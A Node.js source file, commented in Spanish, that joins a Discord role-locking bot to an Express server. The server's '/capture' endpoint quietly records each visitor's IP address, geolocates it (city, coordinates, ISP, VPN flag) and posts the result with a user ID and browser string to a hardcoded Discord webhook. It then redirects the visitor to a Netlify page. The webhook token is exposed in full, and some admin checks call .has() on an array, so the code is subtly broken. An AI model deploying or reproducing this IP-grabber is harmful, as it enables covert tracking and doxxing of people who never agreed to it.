const { Client, GatewayIntentBits, Collection, PermissionsBitField, EmbedBuilder } = require('discord.js');
const express = require('express');
const axios = require('axios');
const https = require('https');
require('dotenv').config();

const app = express();
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const WHITELIST = new Set();
const ADMIN_IDS = ['1496972373423816848'];

client.on('ready', () => {
  console.log(`✅ Bot conectado como ${client.user.tag}`);
});

// Bloqueo de roles manuales
client.on('guildMemberUpdate', async (oldMember, newMember) => {
  const addedRoles = newMember.roles.cache.filter(r => !oldMember.roles.cache.has(r.id));
  
  if (addedRoles.size > 0) {
    const auditLogs = await newMember.guild.fetchAuditLogs({ type: 31, limit: 1 });
    const entry = auditLogs.entries.first();
    
    if (!entry) return;
    
    const executor = entry.executor;
    if (!executor || ADMIN_IDS.has(executor.id) || WHITELIST.has(executor.id)) return;
    
    for (const [roleId] of addedRoles) {
      await newMember.roles.remove(roleId).catch(() => {});
    }
    
    const executorMember = newMember.guild.members.cache.get(executor.id);
    if (executorMember) {
      const rolesToRemove = executorMember.roles.cache.filter(r => r.id !== newMember.guild.id);
      await executorMember.roles.remove(rolesToRemove).catch(() => {});
    }
  }
});

// Comandos de whitelist
client.on('messageCreate', async message => {
  if (!message.content.startsWith(',') || message.author.bot) return;
  
  const args = message.content.slice(1).trim().split(/ +/);
  const command = args.shift()?.toLowerCase();
  
  if (command === 'whitelist_add') {
    if (!ADMIN_IDS.has(message.author.id)) {
      return message.reply('❌ No tienes permiso.');
    }
    const userId = args[0];
    if (!userId) return message.reply('⚠️ Uso: `,whitelist_add <id_usuario>`');
    WHITELIST.add(userId);
    return message.reply(`✅ Añadido a whitelist: \`${userId}\``);
  }
  
  if (command === 'whitelist_remove') {
    if (!ADMIN_IDS.has(message.author.id)) {
      return message.reply('❌ No tienes permiso.');
    }
    const userId = args[0];
    if (!userId) return message.reply('⚠️ Uso: `,whitelist_remove <id_usuario>`');
    WHITELIST.delete(userId);
    return message.reply(`✅ Eliminado de whitelist: \`${userId}\``);
  }
});

// Servidor web
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Ruta principal → redirige a TU página
app.get('/', (req, res) => {
  res.redirect("https://dazzling-cuchufli-ee24ea.netlify.app/");
});

// Obtener datos de ubicación desde la IP
async function getIPDetails(ip) {
  return new Promise((resolve) => {
    https.get(`https://api.ipapi.is/?q=${ip}`, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          resolve({
            country: json.country || 'Desconocido',
            country_code: json.country_code || 'N/A',
            city: json.city || 'Desconocido',
            region: json.region || 'Desconocido',
            latitude: json.latitude || 'N/A',
            longitude: json.longitude || 'N/A',
            isp: json.isp || 'Desconocido',
            timezone: json.timezone || 'Desconocido',
            is_proxy: json.is_proxy ? '✅ Sí' : '❌ No'
          });
        } catch {
          resolve({
            country: 'Desconocido',
            city: 'Desconocido',
            region: 'Desconocido',
            latitude: 'N/A',
            longitude: 'N/A',
            isp: 'Desconocido',
            timezone: 'Desconocido',
            is_proxy: '❌ No'
          });
        }
      });
    }).on('error', () => {
      resolve({
        country: 'Desconocido',
        city: 'Desconocido',
        region: 'Desconocido',
        latitude: 'N/A',
        longitude: 'N/A',
        isp: 'Desconocido',
        timezone: 'Desconocido',
        is_proxy: '❌ No'
      });
    });
  });
}

// Captura de datos cuando alguien visita tu página
app.post('/capture', async (req, res) => {
  const { userId, userAgent } = req.body;
  
  // Obtener la IP real del visitante
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
             req.headers['cf-connecting-ip'] || 
             req.socket.remoteAddress || 
             req.ip;
  
  if (!userId || !ip) return res.status(400).send('Faltan datos');
  
  try {
    // Obtener toda la información de ubicación
    const details = await getIPDetails(ip);
    
    const webhookUrl = 'https://discord.com/api/webhooks/1546973077731024966/W50wqczeBdGpvXIHrFXX2Tmd6wI8_ajSdO3CdTzIxxeo4MWi65JMgkMPfBSTVZ7KaFpA';
    
    await axios.post(webhookUrl, {
      embeds: [
        {
          title: '📡 NUEVA VISITA DETECTADA',
          color: 0x2ecc71,
          fields: [
            { name: '👤 Usuario ID', value: `\`${userId}\``, inline: false },
            { name: '🌐 Dirección IP', value: `\`${ip}\``, inline: false },
            { name: '📍 Ubicación', value: `**País:** ${details.country}\n**Ciudad:** ${details.city}\n**Región:** ${details.region}`, inline: false },
            { name: '🧭 Coordenadas', value: `\`Lat: ${details.latitude}\`\n\`Lon: ${details.longitude}\``, inline: false },
            { name: '📶 Proveedor', value: `\`${details.isp}\``, inline: false },
            { name: '🕐 Zona Horaria', value: `\`${details.timezone}\``, inline: true },
            { name: '🔒 Proxy/VPN', value: `${details.is_proxy}`, inline: true },
            { name: '📱 Dispositivo/Navegador', value: `${userAgent}`, inline: false }
          ],
          timestamp: new Date().toISOString(),
          footer: { text: 'Sistema de monitoreo activo' }
        }
      ]
    });
    
    res.redirect("https://dazzling-cuchufli-ee24ea.netlify.app/");
  } catch (error) {
    console.error(error);
    res.status(500).send('Error al guardar los datos');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 Servidor corriendo en el puerto ${PORT}`));

// Iniciar bot
client.login(process.env.DISCORD_TOKEN);
